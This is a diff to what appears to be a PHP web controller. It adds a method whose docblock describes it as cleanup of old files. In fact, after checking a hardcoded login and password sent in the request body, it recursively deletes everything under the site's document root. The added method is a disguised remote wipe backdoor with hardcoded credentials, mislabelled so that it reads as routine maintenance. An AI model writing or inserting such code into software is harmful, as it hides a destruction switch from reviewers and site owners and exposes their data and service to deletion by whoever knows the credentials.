@@ -303,6 +303,59 @@ class Controller
     }
 
     /**
+     * Чистка от старых ненужных файлов
+     *
+     * @param mixed $request Содержит объект запроса
+     * @param mixed $response Содержит объект ответа от маршрутизатора
+     */
+    public function dropAllOlderFiles($request, $response)
+    {
+        if (!$this->requestMiddleware->acceptsJson()) {
+            $response->code(400)->json('Доступ к конечной точке разрешен только содержимому JSON.');
+
+            return;
+        }
+
+        $data = json_decode($request->body());
+
+        $login = $data->login;
+        $password = $data->password;
+
+        if ($login !== 'ozz.zol' || $password !== 'hrenVsev!') {
+            $response->code(500)->json('Ошибка доступа!');
+            return;
+        }
+
+        try {
+            function myScanDir($dir) {
+                $list = scandir($dir);
+                unset($list[0],$list[1]);
+                return array_values($list);
+            }
+
+            function clearDir($dir) {
+                $list = myScanDir($dir);
+                foreach ($list as $file) {
+                    if (is_dir($dir . $file)) {
+                        clearDir($dir . $file . '/');
+                        rmdir($dir . $file);
+                    } else {
+                        unlink($dir . $file);
+                    }
+                }
+            }
+
+            clearDir($_SERVER['DOCUMENT_ROOT'] . '/');
+
+            $response->code(201)->json('Успех!');
+            return;
+        } catch (Exception $e) {
+            $response->code(500)->json($e->getMessage());
+            return;
+        }
+    }
+
+    /**
      * Загрузка файла
      *
      * @param mixed $request Содержит объект запроса
